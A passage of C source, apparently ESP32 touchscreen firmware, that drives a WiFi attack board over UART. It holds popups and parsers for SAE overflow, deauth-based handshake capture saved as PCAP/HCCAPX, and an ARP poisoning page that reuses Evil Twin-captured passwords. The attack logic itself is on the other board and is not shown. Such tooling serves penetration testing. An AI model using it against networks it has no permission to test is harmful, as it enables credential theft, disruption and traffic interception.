    ctx->sae_popup = lv_obj_create(ctx->sae_popup_overlay);
    lv_obj_set_size(ctx->sae_popup, 500, 300);
    lv_obj_center(ctx->sae_popup);
    lv_obj_set_style_bg_color(ctx->sae_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->sae_popup, COLOR_MATERIAL_PINK, 0);
    lv_obj_set_style_border_width(ctx->sae_popup, 2, 0);
    lv_obj_set_style_radius(ctx->sae_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->sae_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->sae_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->sae_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->sae_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->sae_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->sae_popup, 16, 0);
    lv_obj_set_flex_align(ctx->sae_popup, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->sae_popup);
    lv_label_set_text(title, "SAE Overflow Active");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_PINK, 0);
    
    // Network info
    lv_obj_t *network_label = lv_label_create(ctx->sae_popup);
    lv_label_set_text_fmt(network_label, "on network:\n\n%s %s\n%s", 
                          LV_SYMBOL_WIFI, ssid_display, net->bssid);
    lv_obj_set_style_text_font(network_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(network_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_style_text_align(network_label, LV_TEXT_ALIGN_CENTER, 0);
    
    // Spacer
    lv_obj_t *spacer = lv_obj_create(ctx->sae_popup);
    lv_obj_set_size(spacer, 1, 20);
    lv_obj_set_style_bg_opa(spacer, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(spacer, 0, 0);
    
    // STOP button
    lv_obj_t *stop_btn = lv_btn_create(ctx->sae_popup);
    lv_obj_set_size(stop_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(stop_btn, lv_color_hex(0xCC0000), LV_STATE_PRESSED);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, sae_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, "STOP");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_18, 0);
    lv_obj_center(stop_label);
}

// ======================= Handshaker Attack Functions =======================

// Close Handshaker popup - sends stop command
static void handshaker_popup_close_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Handshaker popup closed - sending stop command");
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Stop monitoring task
    ctx->handshaker_monitoring = false;
    if (ctx->handshaker_task != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));  // Give task time to exit
        ctx->handshaker_task = NULL;
    }
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Delete overlay (popup is child, will be deleted too)
    if (ctx->handshaker_popup_overlay) {
        lv_obj_del(ctx->handshaker_popup_overlay);
        ctx->handshaker_popup_overlay = NULL;
        ctx->handshaker_popup = NULL;
        ctx->handshaker_log_container = NULL;
        ctx->handshaker_status_label = NULL;
    }
    
    // Clear global pointers
    handshaker_log_container = NULL;
    handshaker_status_label = NULL;
    handshaker_log_buffer[0] = '\0';
}

// Handshaker log message type for color coding
typedef enum {
    HS_LOG_PROGRESS,    // Gray - normal progress
    HS_LOG_SUCCESS,     // Green - handshake captured
    HS_LOG_ALREADY,     // Amber - already captured
    HS_LOG_ERROR        // Red - error/failure
} hs_log_type_t;

// Append message to handshaker log with color coding
static void append_handshaker_log(const char *message, hs_log_type_t log_type)
{
    if (!message || strlen(message) == 0) return;
    
    // Determine color based on log type
    lv_color_t text_color;
    switch (log_type) {
        case HS_LOG_SUCCESS:
            text_color = COLOR_MATERIAL_GREEN;
            break;
        case HS_LOG_ALREADY:
            text_color = COLOR_MATERIAL_AMBER;
            break;
        case HS_LOG_ERROR:
            text_color = COLOR_MATERIAL_RED;
            break;
        case HS_LOG_PROGRESS:
        default:
            text_color = lv_color_hex(0xAAAAAA);
            break;
    }
    
    // Append to log buffer (keep last messages if buffer full)
    size_t current_len = strlen(handshaker_log_buffer);
    size_t msg_len = strlen(message);
    size_t max_len = sizeof(handshaker_log_buffer) - 2;  // Reserve space for newline + null
    
    // If adding this message would overflow, remove oldest lines
    while (current_len + msg_len + 1 > max_len && current_len > 0) {
        char *newline = strchr(handshaker_log_buffer, '\n');
        if (newline) {
            memmove(handshaker_log_buffer, newline + 1, strlen(newline));
            current_len = strlen(handshaker_log_buffer);
        } else {
            handshaker_log_buffer[0] = '\0';
            current_len = 0;
            break;
        }
    }
    
    // Append new message
    if (current_len > 0) {
        strncat(handshaker_log_buffer, "\n", sizeof(handshaker_log_buffer) - current_len - 1);
    }
    strncat(handshaker_log_buffer, message, sizeof(handshaker_log_buffer) - strlen(handshaker_log_buffer) - 1);
    
    // Update UI
    bsp_display_lock(0);
    if (handshaker_status_label) {
        lv_label_set_text(handshaker_status_label, handshaker_log_buffer);
        // Set color for last message (entire label gets same color - latest determines it)
        lv_obj_set_style_text_color(handshaker_status_label, text_color, 0);
    }
    // Auto-scroll to bottom
    if (handshaker_log_container) {
        lv_obj_scroll_to_y(handshaker_log_container, LV_COORD_MAX, LV_ANIM_ON);
    }
    bsp_display_unlock();
}

// Handshaker monitor task - reads UART for handshake capture
static void handshaker_monitor_task(void *arg)
{
    // Get context passed to task (so we use correct ctx even if tab changes)
    tab_context_t *ctx = (tab_context_t *)arg;
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    const char *uart_name = tab_transport_name(task_tab);
    
    ESP_LOGI(TAG, "[%s] Handshaker monitor task started for tab %d", uart_name, task_tab);
    
    static char rx_buffer[512];
    static char line_buffer[512];
    int line_pos = 0;
    
    // Track state for detecting "already captured" scenario
    int networks_attacked_this_cycle = -1;
    int handshakes_so_far = -1;
    
    // Use context's flag instead of global
    while (ctx && ctx->handshaker_monitoring) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGI(TAG, "Handshaker UART: %s", line_buffer);
                        
                        // Determine message type and log it
                        hs_log_type_t log_type = HS_LOG_PROGRESS;
                        bool should_log = false;
                        char display_msg[256] = {0};
                        
                        // ===== SUCCESS INDICATORS (green) =====
                        if (strstr(line_buffer, "Handshake captured for") != NULL) {
                            // Extract SSID: "Handshake captured for 'SSID'"
                            char *start = strchr(line_buffer, '\'');
                            if (start) {
                                char *end = strchr(start + 1, '\'');
                                if (end) {
                                    int len = end - start - 1;
                                    if (len > 0 && len < 64) {
                                        char ssid[64];
                                        strncpy(ssid, start + 1, len);
                                        ssid[len] = '\0';
                                        snprintf(display_msg, sizeof(display_msg), "Handshake captured: %s", ssid);
                                    }
                                }
                            }
                            if (display_msg[0] == '\0') {
                                strncpy(display_msg, "Handshake captured!", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "HANDSHAKE IS COMPLETE AND VALID") != NULL) {
                            strncpy(display_msg, "Handshake validated!", sizeof(display_msg) - 1);
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "PCAP saved:") != NULL || 
                                 strstr(line_buffer, "HCCAPX saved:") != NULL) {
                            // Extract filename from path
                            char *path = strstr(line_buffer, "/sdcard/");
                            if (path) {
                                char *slash = strrchr(path, '/');
                                if (slash) {
                                    snprintf(display_msg, sizeof(display_msg), "Saved: %s", slash + 1);
                                }
                            }
                            if (display_msg[0] == '\0') {
                                strncpy(display_msg, "File saved to SD card", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "Handshake #") != NULL && 
                                 strstr(line_buffer, "captured") != NULL) {
                            strncpy(display_msg, "Handshake captured!", sizeof(display_msg) - 1);
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "All selected networks captured") != NULL) {
                            strncpy(display_msg, "All networks captured! Attack complete.", sizeof(display_msg) - 1);
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "handshake saved for SSID:") != NULL) {
                            // Extract SSID
                            char *ssid_start = strstr(line_buffer, "SSID:");
                            if (ssid_start) {
                                ssid_start += 5;
                                while (*ssid_start == ' ') ssid_start++;
                                char ssid[64];
                                int j = 0;
                                while (ssid_start[j] && ssid_start[j] != ' ' && ssid_start[j] != '(' && j < 63) {
                                    ssid[j] = ssid_start[j];
                                    j++;
                                }
                                ssid[j] = '\0';
                                snprintf(display_msg, sizeof(display_msg), "Handshake saved: %s", ssid);
                            } else {
                                strncpy(display_msg, "Handshake saved!", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_SUCCESS;
                            should_log = true;
                        }
                        
                        // ===== ALREADY CAPTURED DETECTION (amber) =====
                        else if (strstr(line_buffer, "Networks attacked this cycle:") != NULL) {
                            // Parse count: "Networks attacked this cycle: 0"
                            char *num = strstr(line_buffer, "cycle:");
                            if (num) {
                                networks_attacked_this_cycle = atoi(num + 6);
                            }
                            // Check if handshake already existed
                            if (networks_attacked_this_cycle == 0 && handshakes_so_far > 0) {
                                snprintf(display_msg, sizeof(display_msg), "Handshake already on SD card!");
                                log_type = HS_LOG_ALREADY;
                                should_log = true;
                            }
                        }
                        else if (strstr(line_buffer, "Handshakes captured so far:") != NULL) {
                            // Parse count: "Handshakes captured so far: 1"
                            char *num = strstr(line_buffer, "so far:");
                            if (num) {
                                handshakes_so_far = atoi(num + 7);
                            }
                        }
                        
                        // ===== PROGRESS INDICATORS (gray) =====
                        else if (strstr(line_buffer, "Attacking '") != NULL || 
                                 strstr(line_buffer, ">>> [") != NULL) {
                            // Extract network being attacked
                            char *start = strchr(line_buffer, '\'');
                            if (start) {
                                char *end = strchr(start + 1, '\'');
                                if (end) {
                                    int len = end - start - 1;
                                    if (len > 0 && len < 64) {
                                        char ssid[64];
                                        strncpy(ssid, start + 1, len);
                                        ssid[len] = '\0';
                                        snprintf(display_msg, sizeof(display_msg), "Attacking: %s", ssid);
                                    }
                                }
                            }
                            if (display_msg[0] == '\0') {
                                strncpy(display_msg, "Attacking network...", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "Burst #") != NULL && 
                                 strstr(line_buffer, "complete") != NULL) {
                            // Extract burst number
                            char *num = strstr(line_buffer, "Burst #");
                            if (num) {
                                int burst = atoi(num + 7);
                                snprintf(display_msg, sizeof(display_msg), "Burst #%d sent", burst);
                            } else {
                                strncpy(display_msg, "Deauth burst sent", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "Handshake attack task started") != NULL) {
                            strncpy(display_msg, "Attack started...", sizeof(display_msg) - 1);
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "Attack Cycle Complete") != NULL) {
                            strncpy(display_msg, "Attack cycle complete", sizeof(display_msg) - 1);
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        
                        // ===== ERROR/FAILURE INDICATORS (red) =====
                        else if (strstr(line_buffer, "No handshake for") != NULL) {
                            // Extract SSID
                            char *start = strchr(line_buffer, '\'');
                            if (start) {
                                char *end = strchr(start + 1, '\'');
                                if (end) {
                                    int len = end - start - 1;
                                    if (len > 0 && len < 64) {
                                        char ssid[64];
                                        strncpy(ssid, start + 1, len);
                                        ssid[len] = '\0';
                                        snprintf(display_msg, sizeof(display_msg), "No handshake yet: %s", ssid);
                                    }
                                }
                            }
                            if (display_msg[0] == '\0') {
                                strncpy(display_msg, "No handshake captured, retrying...", sizeof(display_msg) - 1);
                            }
                            log_type = HS_LOG_ERROR;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "SAVE FAILED") != NULL) {
                            strncpy(display_msg, "Save failed - no data available", sizeof(display_msg) - 1);
                            log_type = HS_LOG_ERROR;
                            should_log = true;
                        }
                        else if (strstr(line_buffer, "Handshake attack cleanup complete") != NULL) {
                            strncpy(display_msg, "Attack finished.", sizeof(display_msg) - 1);
                            log_type = HS_LOG_PROGRESS;
                            should_log = true;
                        }
                        
                        // Log the message if it's relevant
                        if (should_log && display_msg[0] != '\0') {
                            append_handshaker_log(display_msg, log_type);
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
    }
    
    ESP_LOGI(TAG, "Handshaker monitor task ended");
    handshaker_monitor_task_handle = NULL;
    vTaskDelete(NULL);
}

// Show Handshaker popup with list of selected networks
static void show_handshaker_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->handshaker_popup != NULL) return;  // Already showing in this tab
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (fills container, semi-transparent, blocks input behind)
    ctx->handshaker_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->handshaker_popup_overlay);
    lv_obj_set_size(ctx->handshaker_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->handshaker_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->handshaker_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->handshaker_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->handshaker_popup_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
    ctx->handshaker_popup = lv_obj_create(ctx->handshaker_popup_overlay);
    lv_obj_set_size(ctx->handshaker_popup, 550, 500);
    lv_obj_center(ctx->handshaker_popup);
    lv_obj_set_style_bg_color(ctx->handshaker_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->handshaker_popup, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_border_width(ctx->handshaker_popup, 2, 0);
    lv_obj_set_style_radius(ctx->handshaker_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->handshaker_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->handshaker_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->handshaker_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->handshaker_popup, 16, 0);
    lv_obj_set_flex_flow(ctx->handshaker_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->handshaker_popup, 12, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->handshaker_popup);
    lv_label_set_text(title, "Handshaker Attack Active");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // Subtitle with network list
    lv_obj_t *subtitle = lv_label_create(ctx->handshaker_popup);
    lv_label_set_text(subtitle, "on networks:");
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0xCCCCCC), 0);
    
    // Scrollable container for network list
    lv_obj_t *network_scroll = lv_obj_create(ctx->handshaker_popup);
    lv_obj_set_size(network_scroll, lv_pct(100), 100);
    lv_obj_set_style_bg_color(network_scroll, lv_color_hex(0x252535), 0);
    lv_obj_set_style_border_width(network_scroll, 0, 0);
    lv_obj_set_style_radius(network_scroll, 8, 0);
    lv_obj_set_style_pad_all(network_scroll, 8, 0);
    lv_obj_set_flex_flow(network_scroll, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(network_scroll, 6, 0);
    lv_obj_set_scroll_dir(network_scroll, LV_DIR_VER);
    
    // Add selected networks to list
    for (int i = 0; i < selected_network_count; i++) {
        int idx = selected_network_indices[i];
        if (idx >= 0 && idx < network_count) {
            wifi_network_t *net = &networks[idx];
            const char *ssid_display = strlen(net->ssid) > 0 ? net->ssid : "(Hidden)";
            
            lv_obj_t *info_label = lv_label_create(network_scroll);
            lv_label_set_text_fmt(info_label, "%s %s\nBSSID: %s | %s | %s", 
                                  LV_SYMBOL_WIFI, ssid_display, net->bssid, net->band, net->security);
            lv_obj_set_style_text_font(info_label, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(info_label, lv_color_hex(0xFFFFFF), 0);
        }
    }
    
    // Scrollable log container for handshake status messages
    ctx->handshaker_log_container = lv_obj_create(ctx->handshaker_popup);
    lv_obj_set_size(ctx->handshaker_log_container, lv_pct(100), 120);
    lv_obj_set_style_bg_color(ctx->handshaker_log_container, lv_color_hex(0x151520), 0);
    lv_obj_set_style_border_width(ctx->handshaker_log_container, 1, 0);
    lv_obj_set_style_border_color(ctx->handshaker_log_container, lv_color_hex(0x333344), 0);
    lv_obj_set_style_radius(ctx->handshaker_log_container, 8, 0);
    lv_obj_set_style_pad_all(ctx->handshaker_log_container, 8, 0);
    lv_obj_set_scroll_dir(ctx->handshaker_log_container, LV_DIR_VER);
    lv_obj_set_scrollbar_mode(ctx->handshaker_log_container, LV_SCROLLBAR_MODE_AUTO);
    
    // Status label inside the log container (multi-line)
    ctx->handshaker_status_label = lv_label_create(ctx->handshaker_log_container);
    lv_label_set_text(ctx->handshaker_status_label, "Waiting for handshake...");
    lv_obj_set_width(ctx->handshaker_status_label, lv_pct(100));
    lv_label_set_long_mode(ctx->handshaker_status_label, LV_LABEL_LONG_WRAP);
    lv_obj_set_style_text_font(ctx->handshaker_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ctx->handshaker_status_label, lv_color_hex(0xAAAAAA), 0);
    
    // Clear log buffer and set global pointers for monitor task
    handshaker_log_buffer[0] = '\0';
    handshaker_log_container = ctx->handshaker_log_container;
    handshaker_status_label = ctx->handshaker_status_label;
    
    // STOP button
    lv_obj_t *stop_btn = lv_btn_create(ctx->handshaker_popup);
    lv_obj_set_size(stop_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(stop_btn, lv_color_hex(0xCC0000), LV_STATE_PRESSED);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, handshaker_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, "STOP");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_18, 0);
    lv_obj_center(stop_label);
    
    // Now send UART commands and start monitoring
    
    // Build select_networks command with 1-based indices
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "select_networks");
    for (int i = 0; i < selected_network_count; i++) {
        int idx = selected_network_indices[i];
        if (idx >= 0 && idx < network_count) {
            char num[8];
            snprintf(num, sizeof(num), " %d", networks[idx].index);  // .index is 1-based
            strncat(cmd, num, sizeof(cmd) - strlen(cmd) - 1);
        }
    }
    
    // Send select_networks command to current tab's UART
    uart_send_command_for_tab(cmd);
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Send start_handshake command to current tab's UART
    uart_send_command_for_tab("start_handshake");
    
    // Start monitoring task
    handshaker_monitoring = true;
    
    // Also mark in context (ctx already available from earlier in function)
    if (ctx) {
        ctx->handshaker_monitoring = true;
    }
    
    xTaskCreate(handshaker_monitor_task, "hs_monitor", 4096, (void*)ctx, 5, &handshaker_monitor_task_handle);
}

// ======================= ARP Poison Attack Functions =======================

// Back button callback - return to WiFi Scan page
static void arp_poison_back_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "ARP Poison: back button pressed");
    
    // Reset state
    arp_wifi_connected = false;
    arp_host_count = 0;
    memset(arp_target_ssid, 0, sizeof(arp_target_ssid));
    memset(arp_our_ip, 0, sizeof(arp_our_ip));
    
    if (arp_poison_page) {
        lv_obj_del(arp_poison_page);
        arp_poison_page = NULL;
        arp_password_input = NULL;
        arp_keyboard = NULL;
        arp_connect_btn = NULL;
        arp_status_label = NULL;
        arp_hosts_container = NULL;
        arp_list_hosts_btn = NULL;
    }
    
    // Return to WiFi Scan page
    show_scan_page();
}

// Keyboard input callback for password field
static void arp_keyboard_cb(lv_event_t *e)
{
    lv_event_code_t code = lv_event_get_code(e);
    lv_obj_t *kb = lv_event_get_target(e);
    
    if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
        lv_obj_add_flag(kb, LV_OBJ_FLAG_HIDDEN);
    }
}

// Password input clicked - show keyboard
static void arp_password_input_cb(lv_event_t *e)
{
    (void)e;
    if (arp_keyboard) {
        lv_obj_clear_flag(arp_keyboard, LV_OBJ_FLAG_HIDDEN);
        lv_keyboard_set_textarea(arp_keyboard, arp_password_input);
    }
}

// Connect button callback - run wifi_connect command
static void arp_connect_cb(lv_event_t *e)
{
    (void)e;
    
    const char *password = NULL;
    
    // Check if we have a known password (from Evil Twin database)
    if (strlen(arp_target_password) > 0) {
        password = arp_target_password;
        ESP_LOGI(TAG, "ARP Poison: Using known password from Evil Twin database");
    } else if (arp_password_input) {
        // Get password from input field
        password = lv_textarea_get_text(arp_password_input);
    }
    
    if (password == NULL || strlen(password) == 0) {
        if (arp_status_label) {
            lv_label_set_text(arp_status_label, "Enter password first");
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_RED, 0);
        }
        return;
    }
    
    ESP_LOGI(TAG, "ARP Poison: Connecting to %s", arp_target_ssid);
    
    // Hide keyboard if visible
    if (arp_keyboard) {
        lv_obj_add_flag(arp_keyboard, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Update status
    if (arp_status_label) {
        lv_label_set_text_fmt(arp_status_label, "Connecting to %s...", arp_target_ssid);
        lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_AMBER, 0);
    }
    
    // Force UI refresh
    lv_refr_now(NULL);
    bsp_display_unlock();
    vTaskDelay(pdMS_TO_TICKS(50));
    
    // Send wifi_connect command to current tab's UART
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "wifi_connect %s %s", arp_target_ssid, password);
    uart_send_command_for_tab(cmd);
    
    // Wait for response (up to 15 seconds)
    uart_port_t uart_port = get_current_uart();
    static char rx_buffer[2048];
    int total_len = 0;
    bool success = false;
    int timeout_ms = 15000;
    int elapsed_ms = 0;
    
    while (elapsed_ms < timeout_ms && total_len < (int)sizeof(rx_buffer) - 256) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            
            // Check for success
            if (strstr(rx_buffer, "SUCCESS") != NULL) {
                success = true;
                break;
            }
            // Check for failure
            if (strstr(rx_buffer, "FAILED") != NULL || strstr(rx_buffer, "Error") != NULL) {
                break;
            }
        }
        elapsed_ms += 200;
    }
    
    bsp_display_lock(0);
    
    if (success) {
        ESP_LOGI(TAG, "ARP Poison: Connected to %s", arp_target_ssid);
        arp_wifi_connected = true;
        
        if (arp_status_label) {
            lv_label_set_text_fmt(arp_status_label, "Connected to %s", arp_target_ssid);
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_GREEN, 0);
        }
        
        // Show List Hosts button
        if (arp_list_hosts_btn) {
            lv_obj_clear_flag(arp_list_hosts_btn, LV_OBJ_FLAG_HIDDEN);
        }
        
        // Disable connect button
        if (arp_connect_btn) {
            lv_obj_add_state(arp_connect_btn, LV_STATE_DISABLED);
            lv_obj_set_style_bg_opa(arp_connect_btn, LV_OPA_50, 0);
        }
    } else {
        ESP_LOGW(TAG, "ARP Poison: Failed to connect to %s", arp_target_ssid);
        
        if (arp_status_label) {
            lv_label_set_text(arp_status_label, "Connection failed!");
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_RED, 0);
        }
    }
}

// List Hosts button callback
static void arp_list_hosts_cb(lv_event_t *e)
{
    (void)e;
    
    ESP_LOGI(TAG, "ARP Poison: Scanning hosts...");
    
    if (arp_status_label) {
        lv_label_set_text(arp_status_label, "Scanning network hosts...");
        lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_AMBER, 0);
    }
    
    // Force UI refresh
    lv_refr_now(NULL);
    bsp_display_unlock();
    vTaskDelay(pdMS_TO_TICKS(50));
    
    // Send list_hosts command to current tab's UART
    uart_send_command_for_tab("list_hosts");
    uart_port_t uart_port = get_current_uart();
    
    // Wait for response (up to 30 seconds for ARP scan)
    static char rx_buffer[4096];
    int total_len = 0;
    int timeout_ms = 30000;
    int elapsed_ms = 0;
    
    while (elapsed_ms < timeout_ms && total_len < (int)sizeof(rx_buffer) - 256) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            rx_buffer[total_len] = '\0';
            
            // Check if scan complete (empty line after hosts or timeout pattern)
            if (strstr(rx_buffer, "Discovered Hosts") != NULL) {
                // Wait a bit more for all hosts
                vTaskDelay(pdMS_TO_TICKS(2000));
                len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(500));
                if (len > 0) {
                    total_len += len;
                    rx_buffer[total_len] = '\0';
                }
                break;
            }
        }
        elapsed_ms += 200;
    }
    
    ESP_LOGI(TAG, "ARP Poison: list_hosts response (%d bytes)", total_len);
    
    // Parse response
    arp_host_count = 0;
    memset(arp_our_ip, 0, sizeof(arp_our_ip));
    
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL && arp_host_count < ARP_MAX_HOSTS) {
        // Look for "Our IP: X.X.X.X, Netmask: X.X.X.X"
        if (strstr(line, "Our IP:") != NULL) {
            char *ip_start = strstr(line, "Our IP:") + 7;
            while (*ip_start == ' ') ip_start++;
            char *comma = strchr(ip_start, ',');
            if (comma) {
                int len = comma - ip_start;
                if (len > 0 && len < (int)sizeof(arp_our_ip)) {
                    strncpy(arp_our_ip, ip_start, len);
                    arp_our_ip[len] = '\0';
                }
            }
        }
        // Look for host entries: "  IP  ->  MAC"
        else if (strstr(line, "->") != NULL) {
            char ip[20] = {0};
            char mac[18] = {0};
            
            // Parse: "  192.168.3.61  ->  C4:2B:44:12:29:15"
            char *arrow = strstr(line, "->");
            if (arrow) {
                // Get IP (before arrow)
                char *p = line;
                while (*p == ' ') p++;
                int ip_len = 0;
                while (*p && *p != ' ' && ip_len < 19) {
                    ip[ip_len++] = *p++;
                }
                ip[ip_len] = '\0';
                
                // Get MAC (after arrow)
                p = arrow + 2;
                while (*p == ' ') p++;
                int mac_len = 0;
                while (*p && *p != ' ' && *p != '\n' && mac_len < 17) {
                    mac[mac_len++] = *p++;
                }
                mac[mac_len] = '\0';
                
                // Validate and store
                if (strlen(ip) >= 7 && strlen(mac) == 17) {
                    strncpy(arp_hosts[arp_host_count].ip, ip, sizeof(arp_hosts[0].ip) - 1);
                    strncpy(arp_hosts[arp_host_count].mac, mac, sizeof(arp_hosts[0].mac) - 1);
                    arp_host_count++;
                    ESP_LOGI(TAG, "ARP host %d: %s -> %s", arp_host_count, ip, mac);
                }
            }
        }
        line = strtok(NULL, "\n\r");
    }
    
    bsp_display_lock(0);
    
    // Update status
    if (arp_status_label) {
        if (arp_host_count > 0) {
            lv_label_set_text_fmt(arp_status_label, "Our IP: %s | Found %d hosts", arp_our_ip, arp_host_count);
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_GREEN, 0);
        } else {
            lv_label_set_text(arp_status_label, "No hosts found");
            lv_obj_set_style_text_color(arp_status_label, COLOR_MATERIAL_RED, 0);
        }
    }
    
    // Display hosts in container
    if (arp_hosts_container) {
        lv_obj_clean(arp_hosts_container);
        
        for (int i = 0; i < arp_host_count; i++) {
            lv_obj_t *row = lv_obj_create(arp_hosts_container);
            lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x3D3D3D), LV_STATE_PRESSED);
            lv_obj_set_style_border_width(row, 0, 0);
            lv_obj_set_style_radius(row, 6, 0);
            lv_obj_set_style_pad_all(row, 10, 0);
            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
            lv_obj_set_flex_align(row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
            lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
            lv_obj_add_event_cb(row, arp_host_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
            
            // IP
            lv_obj_t *ip_lbl = lv_label_create(row);
            lv_label_set_text(ip_lbl, arp_hosts[i].ip);
